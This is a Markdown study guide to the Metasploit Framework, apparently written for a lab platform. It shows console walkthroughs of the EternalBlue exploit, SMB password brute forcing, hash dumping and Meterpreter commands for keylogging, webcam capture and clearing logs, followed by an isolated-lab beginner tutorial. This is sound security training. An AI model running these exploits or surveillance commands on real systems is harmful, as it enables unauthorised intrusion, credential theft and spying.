# Metasploit

A practical, hands-on overview of the Metasploit Framework—its components,
common workflows, and real console examples.

> **Tip:** Use collapsible sections below to keep long outputs tidy on GitHub.

## Table of Contents

- [Metasploit](#metasploit)
  - [Table of Contents](#table-of-contents)
  - [Main Components of Metasploit](#main-components-of-metasploit)
    - [Key Terms](#key-terms)
    - [Module Types](#module-types)
  - [Initial Setup](#initial-setup)
    - [Sample output (collapsed)](#sample-output-collapsed)
  - [Using Metasploit](#using-metasploit)
    - [Common Options](#common-options)
    - [Unset \& Global Options (`setg`)](#unset--global-options-setg)
  - [Searching \& Info](#searching--info)
    - [Example: SSH Login Check Scanner (collapsed)](#example-ssh-login-check-scanner-collapsed)
  - [Walkthroughs \& Examples](#walkthroughs--examples)
    - [EternalBlue (MS17-010)](#eternalblue-ms17-010)
    - [Full console output (collapsed)](#full-console-output-collapsed)
    - [Port \& Service Discovery](#port--service-discovery)
    - [Sample Nmap output (collapsed)](#sample-nmap-output-collapsed)
    - [SMB Login Brute Force (Scanner)](#smb-login-brute-force-scanner)
    - [Result snippet (collapsed)](#result-snippet-collapsed)
    - [NetBIOS Enumeration](#netbios-enumeration)
    - [HTTP Version Detection](#http-version-detection)
    - [Finding Files with Meterpreter](#finding-files-with-meterpreter)
  - [Notes \& Good Practice](#notes--good-practice)
  - [Meterpreter](#meterpreter)
    - [Meterpreter commands](#meterpreter-commands)
    - [Core commands](#core-commands)
  - [Beginner Tutorial](#beginner-tutorial)

---

## Main Components of Metasploit

- **msfconsole**: The main command-line interface for interacting with
  Metasploit.
- **Modules** (building blocks):
  - **Exploits**: Code that leverages vulnerabilities on target systems.
  - **Auxiliary**: Scanners, crawlers, fuzzers, etc.
  - **Payloads**: Code executed on the target after exploitation (e.g., reverse
    shell).
  - **Encoders**: Obfuscate payloads to evade signature-based detection.
  - **Evasion**: Modules designed to bypass security mechanisms.
  - **NOPs**: “No Operation” instructions used as buffers in payloads.
  - **Post**: Post-exploitation modules for actions after gaining access.
- **Tools**: Stand-alone utilities for payload generation and exploit
  development.
  - Examples: `msfvenom` (payload generation), `pattern_create`,
    `pattern_offset` (exploit dev).

> _This module covers `msfvenom`; the pattern tools are helpful for exploit
> development._

### Key Terms

- **Exploit**: Code that takes advantage of a vulnerability on the target.
- **Vulnerability**: A flaw in design, code, or logic that can be exploited.
- **Payload**: The code delivered by an exploit to achieve a goal (shell,
  command exec, etc.).

### Module Types

Under **payloads** you’ll see four directories:

- **adapters**: Wrap single payloads into different formats (e.g., PowerShell
  one-liner).
- **singles**: Self-contained payloads that don’t fetch additional components.
- **stagers**: Set up a comms channel to deliver a larger **stage**.
- **stages**: The larger functionality downloaded by the stager.

---

## Initial Setup

```bash
msfupdate
msfconsole
```

### Sample output (collapsed)

```bash
root@ip-10-10-63-107:~# msfupdate
# ... GPG key warning example ...
metasploit-framework is already the newest version (6.4.55~20250326102656~1rapid7-1)
```

```text
=[ metasploit v6.4.55-dev- ]
- -- --=[ 2502 exploits - 1287 auxiliary - 431 post ]
- -- --=[ 1616 payloads - 49 encoders - 13 nops ]
- -- --=[ 9 evasion ]
Metasploit Documentation: https://docs.metasploit.com/
```

```bash
msf6 > ls
msf6 > ping -c 1 8.8.8.8
msf6 > history
```

</details>

---

## Using Metasploit

### Common Options

- **RHOSTS**: Target host(s). Supports single IP, CIDR (`/24`), ranges (`x–y`),
  or file: `file:/path/to/targets.txt`.
- **RPORT**: Target service port.
- **PAYLOAD**: Payload to use with an exploit.
- **LHOST**: Your attacking host IP (listener).
- **LPORT**: Your listener port.
- **SESSION**: Session ID (for post-exploitation modules).

### Unset & Global Options (`setg`)

- Set a value: `set <NAME> <VALUE>`
- Clear one: `unset <NAME>`
- Clear all: `unset all`
- Global default: `setg <NAME> <VALUE>` (applies across modules)

---

## Searching & Info

```bash
msf6 > search type:auxiliary ssh_login
msf6 > info auxiliary/scanner/ssh/ssh_login
```

### Example: SSH Login Check Scanner (collapsed)

```text
Name: SSH Login Check Scanner
Module: auxiliary/scanner/ssh/ssh_login
Rank: Normal
Options:
  RHOSTS (required), RPORT (22), USER_FILE, PASS_FILE, ...
Description:
  Tests SSH logins on a range of machines and reports successful logins.
References:
  https://nvd.nist.gov/vuln/detail/CVE-1999-0502
```

</details>

---

## Walkthroughs & Examples

### EternalBlue (MS17-010)

```bash
msf6 > setg RHOSTS 10.10.226.222
msf6 > use exploit/windows/smb/ms17_010_eternalblue
msf6 exploit(...) > exploit -z
msf6 exploit(...) > sessions
msf6 exploit(...) > sessions -i 1
meterpreter >
```

### Full console output (collapsed)</strong></summary>

```text
[+] Host is likely VULNERABLE to MS17-010! - Windows 7 Professional 7601 SP1 x64
[*] Meterpreter session 1 opened (10.10.63.107:4444 -> 10.10.226.222:49176)
...
```

</details>

---

### Port & Service Discovery

Search for scanners:

```bash
msf6 > search portscan
```

Use the TCP port scanner:

```bash
msf6 > use auxiliary/scanner/portscan/tcp
msf6 auxiliary(...) > show options
msf6 auxiliary(...) > set RHOSTS 10.10.108.124
msf6 auxiliary(...) > set PORTS 1-10000
msf6 auxiliary(...) > run
```

Run `nmap` from inside `msfconsole`:

```bash
msf6 > nmap -sS 10.10.108.124
```

### Sample Nmap output (collapsed)</strong></summary>

```text
PORT     STATE SERVICE
21/tcp   open  ftp
22/tcp   open  ssh
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
8000/tcp open  http-alt
```

</details>

---

### SMB Login Brute Force (Scanner)

```bash
msf6 > use auxiliary/scanner/smb/smb_login
msf6 auxiliary(...) > set RHOSTS 10.10.108.124
msf6 auxiliary(...) > set SMBUser penny
msf6 auxiliary(...) > set PASS_FILE /usr/share/wordlists/MetasploitRoom/MetasploitWordlist.txt
msf6 auxiliary(...) > run
```

### Result snippet (collapsed)</strong></summary>

```text
[+] 10.10.108.124:445 - Success: '.\penny:leo1234'
[_] ... Bruteforce completed, 1 credential was successful.
```

</details>

---

### NetBIOS Enumeration

```bash
msf6 > use auxiliary/scanner/netbios/nbname
msf6 auxiliary(...) > set RHOSTS 10.10.108.124
msf6 auxiliary(...) > run
```

``` bash
[+] 10.10.108.124 [] OS:Unix Names:(**MSBROWSE**, , ACME IT SUPPORT) Mac:00:00:00:00:00:00
```

</details>

---

### HTTP Version Detection

```bash
msf6 > use auxiliary/scanner/http/http_version
msf6 auxiliary(...) > set RHOSTS 10.10.108.124
msf6 auxiliary(...) > set RPORT 8000
msf6 auxiliary(...) > run
```

```text
[+] 10.10.108.124:8000 webfs/1.21 (403-Forbidden)
```

</details>

---

### Finding Files with Meterpreter

```bash
meterpreter > pwd
meterpreter > search -f flag.txt
meterpreter > cd C:\Users\Jon\Documents
meterpreter > dir
meterpreter > cat flag.txt
```

```text
Found 1 result
c:\Users\Jon\Documents\flag.txt  Size: 15
THM-5455554845
```

You can also dump hashes (requires appropriate privileges):

```bash
meterpreter > hashdump
```

```text
Administrator:500:...:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:...:31d6cfe0d16ae931b73c59d7e0c089c0:::
pirate:1001:...:8ce9a3ebd1647fcc5e04025019f4b875:::
```

</details>

---

## Notes & Good Practice

- Most exploits have a default payload; list alternatives with `show payloads`.
- Use `info` (or `info -d`) to view full module details and references.
- Prefer **verification** modules (e.g., checks) before exploitation.
- Keep `setg` values tidy (`unsetg` by clearing with `unset` or new session) to
  avoid accidental reuse.
- Respect scopes, legal boundaries, and engagement rules at all times.

## Meterpreter

We have used the getpid command, which returns the process ID with which
Meterpreter is running. The process ID (or process identifier) is used by
operating systems to identify running processes. All processes running in Linux
or Windows will have a unique ID number; this number is used to interact with
the process when the need arises (e.g. if it needs to be stopped).

If we list processes running on the target system using the ps command, we see
PID 1304 is spoolsv.exe and not Meterpreter.exe, as one might expect.

Even if we were to go a step further and look at DLLs (Dynamic-Link Libraries)
used by the Meterpreter process (PID 1304 in this case), we still would not find
anything jumping at us (e.g. no meterpreter.dll)

The easiest way to have an idea about available Meterpreter versions could be to
list them using msfvenom, as seen below.

We have used the msfvenom --list payloads command and grepped "meterpreter"
payloads (adding | grep meterpreter to the command line), so the output only
shows these.

Your decision on which version of Meterpreter to use will be mostly based on
three factors;

The target operating system (Is the target operating system Linux or Windows? Is
it a Mac device? Is it an Android phone? etc.) Components available on the
target system (Is Python installed? Is this a PHP website? etc.) Network
connection types you can have with the target system (Do they allow raw TCP
connections? Can you only have an HTTPS reverse connection? Are IPv6 addresses
not as closely monitored as IPv4 addresses? etc.)

### Meterpreter commands

Core commands will be helpful to navigate and interact with the target system.
Below are some of the most commonly used. Remember to check all available
commands running the help command once a Meterpreter session has started.

The getuid command will display the user with which Meterpreter is currently
running. This will give you an idea of your possible privilege level on the
target system (e.g. Are you an admin level user like NT AUTHORITY\SYSTEM or a
regular user?)

The ps command will list running processes. The PID column will also give you
the PID information you will need to migrate Meterpreter to another process.

### Core commands

background: Backgrounds the current session exit: Terminate the Meterpreter
session guid: Get the session GUID (Globally Unique Identifier) help: Displays
the help menu info: Displays information about a Post module irb: Opens an
interactive Ruby shell on the current session load: Loads one or more
Meterpreter extensions migrate: Allows you to migrate Meterpreter to another
process run: Executes a Meterpreter script or Post module sessions: Quickly
switch to another session File system commands

cd: Will change directory ls: Will list files in the current directory (dir will
also work) pwd: Prints the current working directory edit: will allow you to
edit a file cat: Will show the contents of a file to the screen rm: Will delete
the specified file search: Will search for files upload: Will upload a file or
directory download: Will download a file or directory Networking commands

arp: Displays the host ARP (Address Resolution Protocol) cache ifconfig:
Displays network interfaces available on the target system netstat: Displays the
network connections portfwd: Forwards a local port to a remote service route:
Allows you to view and modify the routing table System commands

clearev: Clears the event logs execute: Executes a command getpid: Shows the
current process identifier getuid: Shows the user that Meterpreter is running as
kill: Terminates a process pkill: Terminates processes by name ps: Lists running
processes reboot: Reboots the remote computer shell: Drops into a system command
shell shutdown: Shuts down the remote computer sysinfo: Gets information about
the remote system, such as OS Others Commands (these will be listed under
different menu categories in the help menu)

idletime: Returns the number of seconds the remote user has been idle
keyscan_dump: Dumps the keystroke buffer keyscan_start: Starts capturing
keystrokes keyscan_stop: Stops capturing keystrokes screenshare: Allows you to
watch the remote user's desktop in real time screenshot: Grabs a screenshot of
the interactive desktop record_mic: Records audio from the default microphone
for X seconds webcam_chat: Starts a video chat webcam_list: Lists webcams
webcam_snap: Takes a snapshot from the specified webcam webcam_stream: Plays a
video stream from the specified webcam getsystem: Attempts to elevate your
privilege to that of local system hashdump: Dumps the contents of the SAM
database

## Beginner Tutorial

Goal

Set up a tiny offline lab with:

Kali Linux (attacker with Metasploit preinstalled)

Metasploitable 2 (intentionally vulnerable target)

An internal-only network so nothing touches your home/office LAN

Prereqs (quick)

A host PC with ~8–12 GB free RAM and ~40 GB disk

Virtualization app: VirtualBox or VMware Workstation/Player

ISOs/OVAs:

Kali Linux image

Metasploitable 2 VM (usually provided as a ready-made VM)

Keep both VMs offline (no bridged networking).

Create the isolated network
VirtualBox

File → Tools → Network Manager → Host-only Networks → Create

Note the network (e.g., 192.168.56.0/24). DHCP on is fine.

You’ll use this host-only network for both VMs.

VMware (Player/Workstation)

Edit → Virtual Network Editor

Create or use an existing Host-only network (e.g., VMnet1, 192.168.56.0/24).

Import / Install the VMs
Metasploitable 2

Import the provided VM (OVA/VMX).

Network adapter: set to Host-only (the one you created).

Kali Linux

Create a new VM and install from the ISO (or import the prebuilt image).

Network adapter: set to Host-only (same network as Metasploitable).

Optional: add a second adapter on Kali as NAT for updates, but disable it when practicing.
Keep Metasploitable on host-only only.

First boot & IP checks

Start Metasploitable first, then Kali.

On Metasploitable console:

``` bash
ifconfig     # or: ip a


Note the host-only IP (e.g., 192.168.56.101).

On Kali:

ip a
ping -c 2 192.168.56.101   # confirm reachability
```

If ping fails:

Ensure both VMs use the same host-only network.

Reboot VMs after changing adapters.

Basic hygiene on Kali

Open a terminal on Kali:

``` bash
sudo apt update && sudo apt -y upgrade
msfconsole
```

In Metasploit:

version
help

 Recon → Metasploit (non-destructive)

We’ll map services first with nmap,
then confirm one inside Metasploit using a safe auxiliary module.

5.1 Quick host discovery & service map (Kali terminal)

``` bash
nmap -sn 192.168.56.0/24        # find hosts on the host-only network
nmap -sV -O 192.168.56.101      # replace with your Metasploitable IP
```

Skim open services (FTP/SSH/HTTP/etc.). We’ll pick one to fingerprint safely.

5.2 Start Metasploit and confirm a service banner

Open Metasploit:

``` bash
msfconsole
```

Search for a harmless banner grabber, e.g., FTP:

``` bash

search type:auxiliary banner ftp
use auxiliary/scanner/ftp/ftp_version
show options
set RHOSTS 192.168.56.101
run
```

You should see the FTP service banner (version string). Try SSH next:

``` bash
use auxiliary/scanner/ssh/ssh_version
set RHOSTS 192.168.56.101
run
```

These auxiliary modules don’t exploit anything; they just read banners.
Perfect for learning the Metasploit workflow safely:
search → use → show options → set → run.

Build good habits (tiny checklist)

Read info before running anything.

Keep a lab log (Markdown):

Date, target IP, tools/commands, module names, outputs, what you learned.

Snapshot both VMs now that they’re configured (so you can revert anytime).

Optional quality-of-life

In msfconsole, enable command history timestamps:

``` bash
irb
```

not essential, but you can explore; type 'exit' to leave irb

Create resource scripts to replay commands (later):

``` bash
makerc ~/msf_history.rc
```

(Then you can resource ~/msf_history.rc to rerun a session’s commands.)

Safety guardrails (non-negotiable)

Keep Metasploitable on host-only. Do not bridge it to your real LAN.

Only scan the lab IPs you control.

Don’t run exploit modules outside this lab.

When done, power off the target VM.

Troubleshooting quick fixes

No IP on host-only: reboot VM; check adapter is indeed Host-only.

Services not responding:
Metasploitable might take ~a minute to start all services;
give it a moment, then nmap again.

“Module not found”: update Metasploit:

``` bash
sudo apt update && sudo apt -y install metasploit-framework
msfupdate   # if available on your build
```

What to practice next (still safe)

More banner/Version checks:

``` bash
auxiliary/scanner/http/http_version

auxiliary/scanner/smb/smb_version

Enumerate HTTP titles/headers:

auxiliary/scanner/http/title
```

Compare your Metasploit findings to nmap -sV results (consistency check).
